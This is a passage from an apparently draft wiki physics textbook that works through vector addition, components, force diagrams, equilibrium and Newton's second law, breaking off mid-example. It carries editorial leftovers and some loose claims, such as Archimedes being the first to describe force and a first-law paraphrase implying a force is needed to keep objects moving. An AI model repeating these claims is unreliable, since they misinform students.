'''Construction Step 3''': Since the ship is now at port B we draw the third vector 5.5''cm'' long starting from this point in the direction
south-west. A protractor is required to measure the angle of 45&lt;sup&gt;o&lt;/sup&gt;.

[[Image:fhsst_vectors34.png|644px|]]

'''Construction Step 4''': As a final step we draw the resultant displacement from the starting point (the harbour H) to the end point (port C). 
We use a ruler to measure the length of this arrow and a protractor to determine its direction

[[Image:fhsst_vectors35.png|644px|]]

Step 4 : 

We now use the scale to convert the length of the resultant in the scale diagram to the actual displacement in the problem. Since we have
chosen a scale of 1''cm'' = 1''km'' in this problem the resultant has a magnitude of 8.38 &amp;nbsp; ''km''. The direction can be specified in terms of the
angle measured either as 75.4&lt;sup&gt;o&lt;/sup&gt; east of north or on a bearing of 75.4&lt;sup&gt;o&lt;/sup&gt;.

Step 5 : 

Now we can quote the final answer: The resultant displacement of the ship is 8.38 &amp;nbsp; ''km'' on a bearing of 75.4&lt;sup&gt;o&lt;/sup&gt;!

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 5 Tail-to-Head Graphical Addition II====

'''Question:''' A man walks 40 &amp;nbsp; ''m'' East, then 30 &amp;nbsp; ''m'' North.

a) What was the total distance he walked?

b) What is his resultant displacement?


'''Answer:'''

Step 1 : 

What distance did the man travel? In the first part of his journey he traveled 40 &amp;nbsp; ''m'' and in the second part he traveled 30 &amp;nbsp; ''m''. This
gives us a total distance traveled of &lt;math&gt;40+30=70\ m&lt;/math&gt;

Step 2 : 

What is his resultant displacement? The man's resultant displacement is the '''vector'''
from where he started to where he ended. It is the sum of his two separate displacements. We will use the tail-to-head method of
accurate construction to find this vector. Firstly, we draw a rough sketch:

[[Image:fhsst_vectors36.png|327px|]]

Step 3 : 

Next we choose a scale suitable for the problem. A scale of 1''cm'' represents 5''m'' (1''cm'' = 5''m'') is a good choice here. Now we can
begin the process of construction. 

Step 4 : 

We draw the first displacement as an arrow 8''cm'' long (according to the scale &lt;math&gt;8cm = 8\times5m = 40m&lt;/math&gt;) in the direction east:

[[Image:fhsst_vectors37.png|468px|]]

Step 5 : 

Starting from the head of the first vector we draw the second displacement as an arrow 6''cm'' long (according to the scale &lt;math&gt;6cm = 6\times5m = 30m&lt;/math&gt;) in the direction north:&lt;/math&gt;

[[Image:fhsst_vectors38.png|468px|]]

Step 6 : 

Now we connect the starting point to the end point and
measure the length and direction of this arrow (the resultant)

Step 7 : 

Finally we use the scale to convert the length of the resultant in the scale diagram to the actual magnitude of the resultant
displacement. According to the chosen scale 1''cm'' = 5''m''. Therefore 10''cm'' represents 50''m''. The resultant
displacement is then 50''m'' 36.9&lt;sup&gt;o&lt;/sup&gt; north of east.

&lt;hr style=&quot;background-color:red&quot; /&gt;

===The Parallelogram Method===

When needing to find the resultant of two vectors another graphical technique can be applied- the parallelogram method. The following
strategy is employed:

* Choose a scale and a reference direction.
* Choose either of the vectors to be added and draw it as an arrow of the correct length in the correct direction.
* Draw the second vector as an arrow of the correct length in the correct direction '''from the &lt;font id=&quot;txt3991&quot;&gt;tail of the first vector'''.
* Complete the parallelogram formed by these two vectors.
* The resultant is then the diagonal of the parallelogram. Its magnitude can be determined from the length of its arrow using the scale. Its direction too can be determined from the scale diagram.

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 6====
Parallelogram Method of Graphical Addition I

'''Question:''' A force of ''F''&lt;sub&gt;1&lt;/sub&gt; = 5 N is applied to a block in a horizontal direction. A second force ''F''&lt;sub&gt;2&lt;/sub&gt; = 4 N is applied to the object
at an angle of 30&amp;deg; above the horizontal.


[[Image:fhsst_vectors39.png|191px|]]

Determine the resultant force acting on the block using the parallelogram method of accurate construction.

'''Answer:'''

Step 1 : 

Firstly we make a rough sketch of the vector diagram:

[[Image:fhsst_vectors40.png|304px|]]

Step 2 : 

Now we choose a suitable scale. In this problem a scale of 1 cm = 0.5 N would be appropriate, since then the vector diagram would take up a reasonable fraction of the page. We can now begin the accurate scale diagram.

Step 3 : 

Let us draw ''F''&lt;sub&gt;1&lt;/sub&gt; first. According to the scale it has length 10 cm:

[[Image:fhsst_vectors41.png|626px|]]

Step 4 : 

Next we draw ''F''&lt;sub&gt;2&lt;/sub&gt;. According to the scale it has length 8 cm. We make use of a protractor to draw this vector at 30° to the horizontal:


[[Image:fhsst_vectors42.png|630px|]]

Step 5 : 

Next we complete the parallelogram and draw the diagonal:

''' RIAAN NOTE: Image missing img155.png PDF page 51'''
[[Image:fhsst_vectors43.png|630px|]]

Step 6 : 

Finally we use the scale to convert the measured length into the actual magnitude. Since 1 cm = 0.5  N, 17.4 cm represents 8.7 N. Therefore the resultant force is 8.7 N at 13.3° above the horizontal.

&lt;hr style=&quot;background-color:red&quot; /&gt;

The parallelogram method is restricted to the addition of just two vectors. However, it is arguably the most intuitive way of adding two forces acting at a point.

== Algebraic Addition and Subtraction of Vectors ==

===Vectors in a Straight Line===

Whenever you are faced with adding vectors acting in a straight line (i.e. some directed left and some right, or some acting
up and others down) you can use a very simple algebraic technique:

* Choose a positive direction. As an example, for situations involving displacements in the directions west and east, you might choose west as your positive direction. In that case, displacements east are negative.
* Next simply add (or subtract) the vectors with the appropriate signs.
* As a final step the direction of the resultant should be included in words (positive answers are in the positive direction, while negative resultants are in the negative direction).

Let us consider a couple of examples.

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 7====
Adding vectors algebraically I

'''Question:''' A tennis ball is rolled towards a wall which is 10''m'' away to the right. If after striking the wall the ball rolls
a further 2.5''m'' along the ground to the left, calculate algebraically the ball's resultant displacement.

(NOTE TO SELF: PGCE suggest a `more real looking' diagram, followed by a diagram one would draw to solve the problem (like our existing one
with the positive direction shown as an arrow))

'''Answer:'''

Step 1 : 

Let us draw a picture of the situation:

[[Image:fhsst_vectors44.png|349px|]]

Step 2 : 

We know that the resultant displacement of the ball ( &lt;math&gt;\overrightarrow{s}_{resultant}&lt;/math&gt;) is equal to the sum of the ball's separate 
displacements (&lt;math&gt;\overrightarrow{s}_1&lt;/math&gt; and &lt;math&gt;\overrightarrow{s}_2&lt;/math&gt; ):

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{s}_{resultant} &amp; = &amp; \overrightarrow{s}_{1} + \overrightarrow{s}_{2}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Since the motion of the ball is in a straight line (i.e. the ball moves left and right), we can use the method of algebraic addition
just explained.

Step 3 : 

First we choose a positive direction. Let's make to the right the positive direction. This means that to the left becomes the
negative direction.

Step 4 : 

With right positive:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{s}_{1} &amp; = &amp; +10.0m \\&amp; and &amp; \\\overrightarrow{s}_{2} &amp; = &amp; -2.5m\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 5 : 

Next we simply add the two displacements to give the resultant:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{s}_{resultant} &amp; = &amp; (+10m) + (-2.5m) \\&amp; = &amp; (+7.5)m\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 6 : 

Finally, in this case &lt;u&gt;right&lt;/u&gt; means positive so:

&lt;math&gt;\begin{matrix}\overrightarrow{s}_{resultant} &amp; = &amp; 7.5m \rm {\ to \ the \ right}\end{matrix}&lt;/math&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

Let us consider an example of vector subtraction.

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 8====
Subtracting vectors algebraically I

'''Question:''' Suppose that a tennis ball is thrown horizontally towards a wall at 3''m''.''s''&lt;sup&gt;-1&lt;/sup&gt; to the right. After striking the wall,
the ball returns to the thrower at 2''m''.''s''&lt;sup&gt;-1&lt;/sup&gt;. Determine the change in velocity of the ball.

'''Answer:'''

Step 1 : 

Remember that velocity is a vector. The change in the velocity of the ball is equal to the difference between the ball's initial and final velocities:

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta\overrightarrow{v} &amp; = &amp; \overrightarrow{v}_{final} -\overrightarrow{v}_{initial}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Since the ball moves along a straight line (i.e. left and right), we can use the algebraic technique of vector subtraction just discussed.

Step 2 : 

Let's make to the right the positive direction. This means that to the left becomes the negative direction.

Step 3 : 

With right positive:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v}_{initial} &amp; = &amp; +3m.s^{-1} \\&amp; and &amp; \\\overrightarrow{v}_{final} &amp; = &amp; -2m.s^{-1}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Thus, the change in velocity of the ball is:

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta\overrightarrow{v} &amp; = &amp; (-2m.s^{-1}) - (+3m.s^{-1}) \\&amp; = &amp; (-5)m.s^{-1}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Remember that in this case ''right'' means positive so:

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta\overrightarrow{v} &amp; = &amp; 5m.s^{-1} \rm \textbf{\ to \ the \ \emph{left}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

Remember that the technique of addition and subtraction just discussed can only be applied to vectors acting along a straight line.

===A More General Algebraic technique===

In worked example 3 the tail to head method of accurate construction was used to determine the
resultant displacement of a man who travelled first east and then north. However, the man's resultant can be calculated without drawing an
accurate scale diagram. Let us revisit this example. 

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 9====
An Algebraic solution to Worked Example 3

'''Question:''' A man walks 40  ''m'' East, then 30 &amp;nbsp;''m'' North.

# Calculate the man's resultant displacement.


'''Answer:'''

Step 1 : 

As before, the rough sketch looks as follows:

[[Image:fhsst_vectors45.png|328px|]]

Step 2 : 

Note that the triangle formed by his separate displacement vectors and his resultant displacement vector is a right-angle
triangle. We can thus use Pythogoras' theorem to determine the length of the resultant. If the length of the resultant vector is called
''s'' then:

&lt;center&gt;&lt;math&gt;\begin{matrix}s^2&amp;=&amp;(40m)^2 + (30m)^2\\s^2&amp;=&amp;2500m^2\\s&amp;=&amp;50m\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 
Now we have the length of the resultant displacement vector but not yet its direction. To determine its direction we calculate the angle &lt;math&gt;\alpha&lt;/math&gt; between the resultant displacement vector and East. 

We can do this using simple trigonometry:

&lt;center&gt;&lt;math&gt;\begin{matrix}\tan \alpha &amp;=&amp; \frac{opposite}{adjacent}\\\tan \alpha &amp;=&amp; \frac{30}{40}\\\alpha&amp; =&amp; \arctan (0.75) \\\alpha &amp;=&amp; 36.9^o\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Our final answer is then:

* Resultant Displacement: 50 m at 36.9&lt;sup&gt;o&lt;/sup&gt; North of East

This is exactly the same answer we arrived at after drawing a scale diagram!

&lt;hr style=&quot;background-color:red&quot; /&gt;

In the previous example we were able to use simple trigonometry to calculate a man's resultant displacement. This was possible since the
man's directions of motion were perpendicular (north and east). Algebraic techniques, however, are not limited to cases where the vectors to be
combined are along the same straight line or at right angles to one another. The following example illustrates this.

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 10====
Further example of vector addition by calculation

'''Question:''' A man walks from point A to point B which is 12''km'' away on a bearing of 45&lt;sup&gt;o&lt;/sup&gt;. From point B the man walks a
further 8''km'' east to point C. Calculate the man's resultant displacement.

'''Answer:'''

Step 1 : 
Let us begin by drawing a rough sketch of the situation

'''RIAAN NOTE: Image on page 56 is missing'''
[[Image:fhsst_vectors46.png|630px|]]

&lt;math&gt;B\hat{A}F = 45^o&lt;/math&gt; since the man walks initially on a bearing of 45&lt;sup&gt;o&lt;/sup&gt;.Then, &lt;math&gt;A\hat{B}G = B\hat{A}F = 45^o&lt;/math&gt; (alternate angles parallel lines). Both of these angles are included in the rough sketch.

Step 2 : 

Now let us calculate the length of the resultant (AC). Since we know both the lengths of &lt;math&gt;AB&lt;/math&gt; and &lt;math&gt;BC&lt;/math&gt; and the included angle &lt;math&gt;A\hat{{B}}C&lt;/math&gt;, we can use
the cosine rule:

&lt;center&gt;&lt;math&gt;\begin{matrix}AC^2 &amp;=&amp; AB^2 +BC^2 -2\cdot AB\cdot BC\cos(A\hat{B}C)\\&amp;=&amp; (12)^2 + (8)^2 -2\cdot (12)(8)\cos(135^o)\\&amp;=&amp; 343.8\\AC &amp;=&amp; 18.5\ km\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 

Next we use the sine rule to determine the angle &lt;math&gt;\theta&lt;/math&gt;: 

&lt;center&gt;&lt;math&gt;\begin{matrix}\frac{\sin\theta}{8}&amp;=&amp;\frac{\sin 135^0}{18.5}\\\sin\theta &amp;=&amp; \frac{8\times\sin 135^o}{18.5}\\\theta &amp;=&amp; \arcsin(0.3058)\\\theta &amp;=&amp; 17.8^o\end{matrix}&lt;/math&gt;&lt;/center&gt;

Thus, &lt;math&gt;F\hat{A}C=62.8^o&lt;/math&gt;

Step 4 : 

Our final answer is then:

* Resultant Displacement: 18.5''km'' on a bearing of 62.8&lt;sup&gt;o&lt;/sup&gt;

= Components of Vectors =

In the discussion of vector addition we saw that a number of vectors acting together can be combined to give a single vector (the resultant). In
much the same way a single vector can be broken down into a number of vectors which when added give that original vector. These
vectors which sum to the original are called '''components''' of the original vector. The process of breaking a vector into its components
is called '''resolving into components'''.

While summing a given set of vectors gives just one answer (the resultant), a single vector can be resolved into infinitely many sets
of components. In the diagrams below the same black vector is resolved into different pairs of components. These components are shown in red.
When added together the red vectors give the original black vector (i.e. the original vector is the resultant of its components).

[[Image:fhsst_vectors47.png|241px|]]

In practice it is most useful to resolve a vector into components which are at right angles to one another.

==Worked Example 11==
Resolving a vector into components

'''Question:''' A motorist undergoes a displacement of 250''km'' in a direction 30&lt;sup&gt;o&lt;/sup&gt; north of east. Resolve this displacement into
components in the directions north (&lt;math&gt;\overrightarrow{s}_N&lt;/math&gt; and east (&lt;math&gt;\overrightarrow{s}_E&lt;/math&gt;). 

'''Answer:'''

Step 1 : 

Firstly let us draw a rough sketch of the original vector

[[Image:fhsst_vectors48.png|286px|]]

Step 2 : 

Next we resolve the displacement into its components north and east. Since these directions are orthogonal to one another, the
components form a right-angled triangle with the original displacement as its hypotenuse:

[[Image:fhsst_vectors49.png|289px|]]

Notice how the two components acting together give the original vector as their resultant.

Step 3 : 

Now we can use trigonometry to calculate the magnitudes of the components of the original displacement:

&lt;center&gt;&lt;math&gt;\begin{matrix}s_N &amp;=&amp; 250\sin30^o\\&amp;=&amp; 125\ km\end{matrix}&lt;/math&gt;&lt;/center&gt;

and

&lt;center&gt;&lt;math&gt;\begin{matrix}s_E &amp;=&amp; 250\cos30^o\\&amp;=&amp; 216.5\ km\end{matrix}&lt;/math&gt;&lt;/center&gt;

Remember ''s''&lt;sub&gt;N&lt;/sub&gt; and ''s''&lt;sub&gt;E&lt;/sub&gt; are the magnitudes of the components- they are in the directions north and east respectively.

== Block on an incline ==

As a further example of components let us consider a block of mass ''m'' placed on a frictionless surface inclined at some angle &lt;math&gt;\theta&lt;/math&gt; to 
the horizontal. The block will obviously slide down the incline, but what causes this motion?

The forces acting on the block are its weight ''mg'' and the normal force ''N'' exerted by the surface on the object. These two forces are
shown in the diagram below.

[[Image:fhsst_vectors50.png|444px|]]

Now the object's weight can be resolved into components parallel and perpendicular to the inclined surface. These components are shown as
red arrows in the diagram above and are at right angles to each other. The components have been drawn acting from the same
point. Applying the parallelogram method, the two components of the block's weight sum to the weight vector.

To find the components in terms of the weight we can use trigonometry:

&lt;center&gt;&lt;math&gt;\begin{matrix}W_{\|} &amp;=&amp; mg\sin\theta\\W_{\perp} &amp;=&amp; mg\cos\theta\end{matrix}&lt;/math&gt;&lt;/center&gt;

The component of the weight perpendicular to the slope ''W''&lt;sub&gt;&lt;math&gt;\perp&lt;/math&gt;&lt;/sub&gt; exactly balances the normal force ''N'' exerted by the surface. The parallel component, however, &lt;math&gt;W_{\|}&lt;/math&gt; is unbalanced and causes the block to slide down the slope.

== Vector addition using components ==

In Figure 3.3 two vectors are added in a slightly different way to the methods discussed so far. It might look
a little like we are making more work for ourselves, but in the long run things will be easier and we
will be less likely to go wrong. 

In Figure 3.3 the primary vectors we are adding are represented by solid lines and are the same vectors as those added in Figure 3.2 using the less complicated looking method. 

{| 
|- 
| [[Image:fhsst_vectors51.png|363px|]]
|+ '''Figure 3.2:''' An example of two vectors being added to give a resultant
|}

Each vector can be broken down into a component in the ''x''-direction and one in the ''y''-direction. These components are two
vectors which when added give you the original vector as the resultant. Look at the red vector in figure 3.3. If you add up the two red dotted ones in the ''x''-direction and ''y''-direction
you get the same vector. For all three vectors we have shown their respective components as dotted lines in the same colour.

But if we look carefully, addition of the ''x'' components of the two original vectors gives the ''x'' component of the resultant. The same applies to
the ''y'' components. So if we just added all the components together we would get the same answer! This is another important property of vectors.

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 12===
Adding Vectors Using Components

'''Question:''' Lets work through the example shown in Figure 3.3 to determine the resultant.

'''Answer:'''

Step 1 : 

The first thing we must realise is that the order that we add the vectors does not matter. Therefore, we can work through the vectors to be added in any order.

Step 2 : 

Let us start with the bottom vector. If you are told that this vector has a length of 5.385 units and an angle of 21.8&lt;sup&gt;o&lt;/sup&gt; to the
horizontal then we can find its components. We do this by using known trigonometric ratios. First we find the vertical or ''y'' component:

&lt;center&gt;&lt;math&gt;\begin{matrix}\sin \theta &amp; = &amp; \frac{y}{\mbox{hypotenuse}} \\\sin (21.8) &amp; = &amp;\frac{y}{5.385}\\y &amp; = &amp; 5.385 \sin (21.8)\\y &amp; = &amp; 2\end{matrix}&lt;/math&gt;&lt;/center&gt;


[[Image:fhsst_vectors53.png|331px|]]

Secondly we find the horizontal or ''x'' component:

&lt;center&gt;&lt;math&gt;\begin{matrix}\cos \theta &amp; = &amp; \frac{x}{\mbox{hypotenuse}} \\\cos (21.8) &amp; = &amp;\frac{x}{5.385}\\x &amp; = &amp; 5.385 \cos (21.8)\\x &amp; = &amp; 5\end{matrix}&lt;/math&gt;&lt;/center&gt;

We now know the lengths of the sides of the triangle for which our vector is the hypotenuse. If you look at these sides we can assign
them directions given by the dotted arrows. Then our original red vector is just the sum of the two dotted vectors (its components). When we try to
find the final answer we can just add all the dotted vectors because they would add up to the two vectors we want to add.

Step 3 : 

Now we move on to considering the second vector. The green vector has a length of 5 units and a direction of 53.13 degrees to the
horizontal so we can find its components.

&lt;center&gt;&lt;math&gt;\begin{matrix}\sin \theta &amp; = &amp; \frac{y}{\mbox{hypotenuse}} \\\sin (53.13) &amp; = &amp;\frac{y}{5}\\y &amp; = &amp; 5 \sin (53.13)\\y &amp; = &amp; 4\end{matrix}&lt;/math&gt;&lt;/center&gt;


[[Image:fhsst_vectors54.png|210px|]]

&lt;center&gt;&lt;math&gt;\begin{matrix}\cos \theta &amp; = &amp; \frac{x}{\mbox{hypotenuse}} \\\cos (53.13) &amp; = &amp;\frac{x}{5}\\x &amp; = &amp; 5 \cos (53.13)\\x &amp; = &amp; 3\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Now we have all the components. If we add all the ''x''-components then we will have the ''x''-component of the resultant vector. Similarly if
we add all the ''y''-components then we will have the ''y''-component of the resultant vector.

The ''x''-components of the two vectors are 5 units right and then 3 units right. This gives us a final ''x''-component of 8 units right.

The ''y''-components of the two vectors are 2 units up and then 4 units up. This gives us a final ''y''-component of 6 units up.

Step 5 : 

Now that we have the components of the resultant, we can use Pythagoras' theorem to determine the length of the resultant. Let us call the length of the hypotenuse ''l'' and we can calculate its
value 

&lt;center&gt;&lt;math&gt;\begin{matrix}l^2&amp;=&amp;(6)^2 + (8)^2\\l^2&amp;=&amp;100\\l&amp;=&amp;10.\\\end{matrix}&lt;/math&gt;&lt;/center&gt;


[[Image:fhsst_vectors55.png|512px|]]

The resultant has length of 10 units so all we have to do is calculate its direction. We can specify the direction as
the angle the vectors makes with a known direction. To do this you only need to visualize the vector as starting at the origin of
a coordinate system. We have drawn this explicitly below and the angle we will calculate is labeled &lt;math&gt;\alpha&lt;/math&gt;. 

[[Image:fhsst_vectors56.png|467px|]]

Using our known trigonometric ratios we can calculate the value of &lt;math&gt;\alpha&lt;/math&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}\tan \alpha &amp; = &amp; \frac{6}{8} \\\alpha &amp; = &amp; \arctan \frac{6}{8}\\\alpha &amp; = &amp; 36.8^o.\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 6 : 

Our final answer is a resultant of 10 units at 36.8&lt;sup&gt;o&lt;/sup&gt; to the positive ''x''-axis.</text>

= What is a force? =
{{wikipedia|Force}}
The simplest way to describe force is to say that it is a `push' or a `pull'. The push or pull on an object may cause either deformation or may change the state of motion of the object under consideration. The harder you 'push' or 'pull', the more force you are applying.

If we leave aside the deformation aspects, then force can be considered to produce change in the state of the motion of the object i.e. velocity. We have, though, experienced in real life that a 'push' or 'pull' does not always manifest in the change of motion. The reason is simple. A change in the state of motion requires a net force. For example, if the force is great enough to overcome friction
the object being pushed or pulled will move. So long as the forces on an object are balanced (i.e. net force is zero), the state of motion described by &quot;velocity&quot; will remain same.  


In fact, the acceleration of a body is directly proportional to the ''net'' force acting on it. The word ''net'' is important- forces are vectors and
what matters in any situation is the vector sum of all the forces acting on an object.

The unit of force is the newton (symbol N)


|Force was first described by Archimedes. Archimedes of Syracuse (circa 287 BC - 212 BC), was a Greek mathematician, astronomer, philosopher, physicist and engineer. He was killed by a Roman soldier during the sack of the city, despite orders from the Roman general, Marcellus, that he was not to be harmed.

= Force diagrams =

The resultant force acting on an object is the vector sum of the set of forces acting on that
one object. It is very important to remember that we consider all the forces that act on the object under consideration - not the forces that the object might, in turn, apply on other objects.

The easiest way to determine this resultant force is to construct what we call a force diagram. In a force diagram we represent the object by a point and draw all the force vectors connected to that point as arrows. Remember from the  [[FHSST_Physics_Vectors:Vectors|Vectors]] chapter that we use the length of the arrow to indicate the vector's magnitude and the direction of the arrow to show which direction it acts in.

The second step is to rearrange the force vectors so that it is easy to add them together and find the resultant force.

Let us consider an example to get started:

Two people push on a box from opposite sides with a force of 5 N.

[[Image:Fhsst_forces2.png|236px|]]

When we draw the force diagram we represent the box by a dot. The two forces are represented by arrows, with their tails on the dot.

[[Image:Fhsst_forces3.png|151px|]]

See how the arrows point in opposite directions and have the same magnitude (length). This
means that they cancel out and there is no ''net'' force acting on the object.

This result can be obtained algebraically too, since the two forces act along the same line. Firstly we choose a positive direction and then add the two vectors taking their directions into account.

&lt;u&gt;Considering direction towards right as the positive direction&lt;/u&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{res} &amp;=&amp; (+5\mbox{ N})+(-5\mbox{ N})\\&amp;=&amp; 0N\end{matrix}&lt;/math&gt;&lt;/center&gt;

As you work with more complex force diagrams, in which the forces do not exactly balance, you may notice that sometimes you get a negative answer (e.g. -2 N). What does this mean? Does it mean that we have something which is opposite of the force? No, all it means is that the force acts in the opposite direction to the one that you chose to be positive. You can choose the positive direction to be any way you want, but once you have chosen it you must stick with it.

Once a force diagram has been drawn the techniques of vector addition introduced in the previous chapter can be implemented. Depending on
the situation you might choose to use a graphical technique such as the tail-to-head method or the parallelogram method, or else an
algebraic approach to determine the resultant. Since force is a vector, all of these methods apply!

'''Always remember to check your signs'''

==Worked Example 13 Single Force on a block ==

'''Question:''' A block on a frictionless flat surface weighs 100 N. A 75 N force is applied to the block towards the right. What is the net force (or resultant force) on the block?

'''Answer:'''

Step 1 : 
Firstly let us draw a force diagram for the block:

[[Image:Fhsst_forces4.png|151px|]]

'''RIAAN Note image on page 68 is missing'''

Be careful not to forget the two forces perpendicular to the surface. Every object with mass is attracted to the centre of the
earth with a force (the object's weight). However, if this were the only force acting on the block in the vertical direction then the
block would fall through the table to the ground. This does not happen because the table exerts an upward force (the normal force) which
exactly balances the object's weight.

Step 2 : 

Thus, the only unbalanced force is the applied force. This applied force is then the resultant force
acting on the block.</text>

= Equilibrium of Forces =

At the beginning of this chapter it was mentioned that resultant forces cause objects to accelerate. If an object is stationary or
moving at constant velocity then either:


* no forces are acting on the object, or
* the forces acting on that object are exactly balanced.

A resultant force would cause a stationary object to start moving or an object moving with a given velocity to speed up or
slow down or change direction such that the velocity of the object changes.


In other words, for stationary objects or objects moving with constant velocity, the resultant force acting on the object is zero. The object is said to be
in '''equilibrium'''.

If a resultant force acts on an object then that object can be brought into equilibrium by applying an additional force that exactly balances
this resultant. Such a force is called the ''equilibrant'' and is equal in magnitude but opposite in direction to the original resultant
force acting on the object.


 '''Definition:''' The ''equilibrant'' of any number of forces is the single force required to produce equilibrium.


As an example of an object in equilibrium, consider an object held stationary by two ropes in the arrangement below:




Let us draw a force diagram for the object. In the force diagram the object is drawn as a dot and all forces acting on the object are drawn
in the correct directions starting from that dot. In this case, three forces are acting on the object.

Each rope exerts a force on the object in the direction of the rope away from
the object. Since
the object has mass, it is attracted towards the centre of the earth. This weight is represented
in the force diagram as &lt;math&gt;\overrightarrow{W}&lt;/math&gt;. 

Since the object is stationary, the resultant force acting on the object is zero. In other words the three force vectors drawn tail-to-head form a
closed triangle:

[In general, when drawn tail-to-head the forces acting on an object in equilibrium form a closed figure with the head of the last vector
joining up with the tail of the first vector. When only three forces act on an object this closed figure is a triangle. This leads to the
'''triangle law for three forces in equilibrium''':

'''Triangle Law for Three Forces in Equilibrium:''' 
 | Three forces in equilibrium can be represented in magnitude and direction by the three sides of a triangle taken in order.</text>

= Newton's Laws of Motion =

Our current laws of motion were discovered by Sir Isaac Newton. It is said that Sir Isaac Newton started to think about the nature of
motion and gravitation after being struck on the head by a falling apple.

Newton discovered 3 laws describing motion:

== First Law ==

Newton's first law basically says that a force has to be applied to an object to make it move or to make it stop. The first part of that statement definitely makes sense.  The only way I can make something move is to have something give it a push.  The second part of that statement might not be quite as easy to just take as fact.  We've all witnessed objects slow down when nobody is pushing them. How then can we say that the only way to stop an object's motion is with a force?  The answer is that there are forces that we don't always see. Most of the time, the force that we don't see is the force of friction.

Friction is the force that resists motion when two things are sliding past one another. To understand what friction is, think about sandpaper. If you try to rub 2 pieces of sandpaper together, it will be hard to get them to slide. This same phenomenon happens between all objects to some degree. This frictional force is what slows objects down or stops their motion. 

== Second Law ==

{{FHSST Physics/Box|'''Definition:''' The time rate of change in momentum is proportional to the applied force and takes place in the direction of the force. }}
&lt;/blockquote&gt;

The law is represented in the following basic form (the system of measurement is chosen such that constant of proportionality is 1) :

: &lt;math&gt;\mathbf{F} = {d(m \mathbf{v}) \over dt}&lt;/math&gt;

The product of mass and velocity i.e. ''m'''''v''' is called the momentum.  The net force on a particle is, thus, equal to rate change of momentum of the particle with time. Generally mass of the object under consideration is constant and thus can be taken out of the derivative :

: &lt;math&gt;\mathbf{F} = m {d(\mathbf{v}) \over dt}&lt;/math&gt;

: &lt;math&gt;\mathbf{F} = m \mathbf{a}&lt;/math&gt;

{{FHSST Physics/Box|For constant mass, 
&lt;center&gt;&lt;big&gt;&lt;math&gt;
\mathbf{F} = m\mathbf{a}
&lt;/math&gt;&lt;/big&gt;&lt;/center&gt;
}}
&lt;/blockquote&gt;

'''Force''' is equal to '''mass''' times '''acceleration'''.  This version of Newton's Second Law of Motion assumes that the mass of the body does not change with time, and as such, does not represent a general mathematical form of the Law.  Consequently, this equation cannot, for example, be applied to the motion of a rocket, which loses its mass (the lost mass is ejected at the rear of the rocket) with the passage of time.

It makes sense that the direction of the  acceleration is in the direction of the resultant force. If you push something
away from you it doesn't move toward you unless of course there is another force acting on the object towards you!

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 16 Newton's Second Law ===

'''Question:''' A block of mass 10&amp;nbsp;kg is accelerating at 2 m·s&lt;sup&gt;−2&lt;/sup&gt;. What is the
magnitude of the net force acting on the block?

'''Answer:''' 

Step 1 : 

We are given

* the block's mass
* the block's acceleration

all in the correct units.

Step 2 : 

We are asked to find the magnitude of the force applied to the block. Newton's Second Law tells us the relationship between acceleration and force for an object. Since we are only asked for the magnitude we do not need to worry about the directions of the vectors:

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{Net} &amp;=&amp; ma \\&amp;=&amp; 10\ \mbox{kg} \times 2 \mbox{ m} \cdot \mbox{s}^{-2} \\&amp;=&amp; 20\ \mbox{N}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Thus, there must be a net force of 20 N acting on the box.

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 17 Newton's Second Law 2===

'''Question:''' A 12 N force is applied in the positive ''x''-direction to a block of mass 100&amp;nbsp;mg resting on a frictionless flat surface. What is the resulting acceleration of the block? 

'''Answer:''' 

Step 1 : 

We are given

* the block's mass
* the applied force

but the mass is not in the correct units.

Step 2 : 

Let us begin by converting the mass:

&lt;center&gt;&lt;math&gt;\begin{matrix}100 \mbox{ mg} &amp;=&amp; 100 \times 10^{-3} \mbox{ g} = 0.1 \mbox{ g} \\1000 \mbox{ g} &amp;=&amp; 1 \ \mbox{kg} \\1 &amp;=&amp; 1kg\times \frac{1}{1000g} \\&amp;=&amp; \frac{1kg}{1000g} \\0.1g &amp;=&amp; 0.1g \times 1 \\&amp;=&amp; 0.1g \times \frac{1kg}{1000g} \\&amp;=&amp; 0.0001\ kg \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 

We know that net force results in acceleration. Since there is no friction the applied force is the resultant or net force on the
block (refer to the earlier example of the block pushed on the surface of the table). The block will then accelerate in the direction of
this force according to Newton's Second Law.

Step 4 : 

To determine the magnitude of the acceleration:

